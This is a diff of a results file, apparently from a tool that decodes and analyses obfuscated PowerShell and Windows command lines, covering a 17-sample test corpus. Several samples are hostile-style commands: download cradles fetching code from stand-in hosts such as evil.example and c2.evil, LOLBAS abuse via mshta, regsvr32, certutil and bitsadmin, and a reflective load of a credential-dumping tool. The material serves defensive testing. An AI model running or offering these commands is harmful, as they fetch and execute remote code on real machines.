@@ -1,5 +1,5 @@
 {
-  "generated_at": 1785154660.496088,
+  "generated_at": 1785156130.3363748,
   "corpus_size": 17,
   "defect_count": 0,
   "defects_by_severity": {
@@ -13,7 +13,7 @@
       "id": "plain_write_host",
       "category": "plain",
       "cmdline": "Write-Host 'Hello, from PowerShell!'",
-      "elapsed_ms": 0.43,
+      "elapsed_ms": 3.4,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -65,7 +65,7 @@
       "id": "plain_get_process",
       "category": "plain",
       "cmdline": "Get-Process | Where-Object {$_.CPU -gt 100}",
-      "elapsed_ms": 0.387,
+      "elapsed_ms": 0.438,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -117,7 +117,7 @@
       "id": "encoded_command_b64",
       "category": "encoded",
       "cmdline": "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACwAIABmAHIAbwBtACAAUABvAHcAZQByAFMAaABlAGwAbAAhACcA",
-      "elapsed_ms": 0.421,
+      "elapsed_ms": 0.464,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -174,7 +174,7 @@
       "id": "naked_octal_char_reconstruction",
       "category": "multi_layer",
       "cmdline": "$s=[String]::Join([char]0,[char[]]((127,162,151,164,145,55,110,157,163,164,40,47,110,145,154,154,157,54,40,146,162,157,155,40,120,157,167,145,162,123,150,145,154,154,41,47) | %{ [char][Convert]::ToInt",
-      "elapsed_ms": 0.893,
+      "elapsed_ms": 1.14,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -238,7 +238,7 @@
       "id": "iex_downloadstring_cradle",
       "category": "download_cradle",
       "cmdline": "IEX ((New-Object Net.WebClient).DownloadString(\"https://evil.example/x.ps1\"))",
-      "elapsed_ms": 1.009,
+      "elapsed_ms": 0.982,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -314,7 +314,7 @@
       "id": "iwr_bits_cradle",
       "category": "download_cradle",
       "cmdline": "Invoke-WebRequest -Uri \"https://c2.evil/x.dll\" -OutFile \"$env:TEMP\\x.dll\"",
-      "elapsed_ms": 0.532,
+      "elapsed_ms": 0.526,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -382,7 +382,7 @@
       "id": "mshta_javascript_lolbas",
       "category": "lolbas",
       "cmdline": "mshta.exe \"javascript:a=(new ActiveXObject('WScript.Shell')).Run('calc');close();\"",
-      "elapsed_ms": 0.197,
+      "elapsed_ms": 0.196,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -446,7 +446,7 @@
       "id": "rundll32_javascript_lolbas",
       "category": "lolbas",
       "cmdline": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert()",
-      "elapsed_ms": 0.178,
+      "elapsed_ms": 0.167,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -510,7 +510,7 @@
       "id": "regsvr32_scrobj_lolbas",
       "category": "lolbas",
       "cmdline": "regsvr32.exe /s /u /i:http://evil.example/x.sct scrobj.dll",
-      "elapsed_ms": 0.233,
+      "elapsed_ms": 0.247,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -586,7 +586,7 @@
       "id": "aes_static_key_iv",
       "category": "crypto",
       "cmdline": "$k=[Convert]::FromBase64String(\"MDEyMzQ1Njc4OWFiY2RlZg==\");$iv=[Convert]::FromBase64String(\"QUFBQUJCQkJDQ0NDRERERA==\");$c=[Convert]::FromBase64String(\"ge3yA8/ItktGRDGaCK3PoiK+8YV1B+cn+8gtVUAnk3g=\");$a",
-      "elapsed_ms": 2.394,
+      "elapsed_ms": 3.556,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -647,7 +647,7 @@
       "id": "reflection_assembly_load",
       "category": "reflection",
       "cmdline": "[Reflection.Assembly]::Load([Convert]::FromBase64String(\"TVoAAAAA\"));[SharpKatz]::Execute()",
-      "elapsed_ms": 0.717,
+      "elapsed_ms": 0.702,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -700,8 +700,8 @@
     {
       "id": "multi_stage_gzip_iex",
       "category": "multi_layer",
-      "cmdline": "IEX ([IO.StreamReader]::new([IO.Compression.GzipStream]::new([IO.MemoryStream][Convert]::FromBase64String(\"H4sIAGNMZ2oC/wsvyixJ1fXILy5RUPdIzcnJ11FIK8rPVQjIL08tCs4AiiiqAwDvZIgBJAAAAA==\"),[IO.Compressio",
-      "elapsed_ms": 0.905,
+      "cmdline": "IEX ([IO.StreamReader]::new([IO.Compression.GzipStream]::new([IO.MemoryStream][Convert]::FromBase64String(\"H4sIACJSZ2oC/wsvyixJ1fXILy5RUPdIzcnJ11FIK8rPVQjIL08tCs4AiiiqAwDvZIgBJAAAAA==\"),[IO.Compressio",
+      "elapsed_ms": 0.928,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -764,7 +764,7 @@
       "id": "cscript_wscript_lolbas",
       "category": "lolbas",
       "cmdline": "cscript.exe //nologo //E:jscript C:\\Users\\Public\\payload.js",
-      "elapsed_ms": 0.167,
+      "elapsed_ms": 0.17,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -830,7 +830,7 @@
       "id": "certutil_download_lolbas",
       "category": "lolbas",
       "cmdline": "certutil.exe -urlcache -split -f \"http://evil.example/mal.exe\" mal.exe",
-      "elapsed_ms": 0.246,
+      "elapsed_ms": 0.259,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -906,7 +906,7 @@
       "id": "bitsadmin_download_lolbas",
       "category": "lolbas",
       "cmdline": "bitsadmin.exe /transfer job \"http://evil.example/x.exe\" \"%TEMP%\\x.exe\"",
-      "elapsed_ms": 0.222,
+      "elapsed_ms": 0.221,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -981,7 +981,7 @@
       "id": "invoke_obfuscation_full_stack",
       "category": "multi_layer",
       "cmdline": "$cmDwhy =[TyPe](\"STrING\")  ;   $pz2Sb0  =[TYpE](\"cOnvert\")  ;  &(\"InvOKe-EXpReSSiOn\") (  (&(\"gET-vaRIAblE\")  (\"CMdwhy\")).\"vALUe\"::(\"jOiN\").Invoke(\"\",( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ",
-      "elapsed_ms": 2.635,
+      "elapsed_ms": 2.66,
       "sections": {
         "decoded_output": {
           "present": true,
@@ -1052,7 +1052,7 @@
       "id": "wmic_cmd_powershell_downloadstring",
       "category": "download_cradle",
       "cmdline": "wmic process call create CommandLine=\"cmd /c powershell.exe -C Write-Host ([Net.WebClient]::new().DownloadString('https://gist.githubusercontent.com/mgraeber-rc/25ebfac64a2ba5ca22639da9c1aefcfd/raw/d0",
-      "elapsed_ms": 0.871,
+      "elapsed_ms": 0.887,
       "sections": {
         "decoded_output": {
           "present": true,
